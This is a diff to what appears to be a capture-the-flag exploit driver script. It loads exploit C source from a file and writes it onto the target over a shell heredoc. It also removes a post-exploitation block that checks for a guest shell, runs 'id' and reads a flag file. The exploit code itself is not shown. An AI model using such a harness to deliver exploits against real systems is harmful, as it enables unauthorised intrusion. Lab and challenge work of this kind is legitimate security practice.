@@ -111,10 +111,13 @@ def main():
 
     print("[*] Writing exploit.c...")
 
-    host.sendline(b"cat > exploit.c << 'EOF'")
-    host.send(C_CODE.encode())
+    with open(C_CODE_PATH) as f: 
+        exploit_code = f.read()
 
-    if not C_CODE.endswith('\n'):
+    host.sendline(b"cat > exploit.c << 'EOF'")
+    host.send(exploit_code.encode())
+
+    if not exploit_code.endswith('\n'):
         host.send(b'\n')
 
     host.sendline(b"EOF")
@@ -212,32 +215,6 @@ def main():
     print("============== EXPLOIT OUTPUT ==============")
     print(output.decode(errors='replace'))
     print("=============================================")
-
-    if b'\n$ ' in output or b'\n# ' in output:
-        print("[+] Exploit returned to guest shell")
-
-        vm.sendline(b"id")
-
-        try:
-            identity = vm.recvuntil(b'$ ', timeout=5)
-            print(identity.decode(errors='replace').strip())
-        except Exception:
-            pass
-
-        vm.sendline(b"cat /passwd/passwd")
-
-        try:
-            flag_output = vm.recvuntil(b'$ ', timeout=5)
-
-            print()
-            print("================ FLAG ================")
-            print(flag_output.decode(errors='replace').strip())
-            print("======================================")
-        except Exception:
-            pass
-    else:
-        print("[-] Exploit did not return to guest shell")
-        print("[-] VM may have crashed or panicked")
 
     try:
         vm.close()
